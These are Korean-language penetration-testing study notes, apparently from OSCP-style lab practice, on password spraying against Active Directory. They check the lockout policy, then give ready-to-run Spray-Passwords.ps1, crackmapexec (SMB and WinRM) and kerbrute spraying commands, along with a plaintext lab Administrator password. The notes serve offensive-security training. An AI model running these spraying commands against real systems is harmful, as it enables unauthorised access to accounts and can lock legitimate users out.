
> [!중요!!]
    > ** -d 옵션에 machine 이름과 도메인 명을 번갈아 사용하도록 하자!**
    > 사실 netexec 는 --local-auth 옵션을 붙이면 됐다...
### 정책 확인 (win)
```powershell
net accounts
#...
#Lockout threshold: 5
#Lockout duration (minutes): 30
#Lockout observation window (minutes): 30
#...
```

### 정책 확인 (linux)
```bash
netexec smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --pass-pol
```


**패스워드 스프레이**는
→ [Spray-Passwords.ps1](https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1) (windows) - **DirectoryEntry 이용**
→ crackmapexec (linux) - **SMB 이용**
→ kerbrute (windows, linux) - **(AS-REQ)** **TGT 이용**
로 할 수 있음.

### Spray-Passwords.ps1
```powershell
cd C:\\Tools
powershell -ep bypass
.\\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```

### crackmapexec
```powershell
cat users.txt
#dave
#jen
#pete
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

```powershell
# 도메인명 지정과 머신 이름 지정 번갈아서
crackmapexec winrm 10.10.103.154 -u 'Administrator' -p 'hghgib6vHT3bVWf' -d 'oscp.exam' --continue-on-success
crackmapexec winrm 10.10.103.154 -u 'Administrator' -p 'hghgib6vHT3bVWf' -d 'MS02' --continue-on-success
```

### kerbrute
```powershell
type .\\usernames.txt
#pete
#dave
#jen
.\\kerbrute_windows_amd64.exe passwordspray -d corp.com .\\usernames.txt "Nexus123!"
```

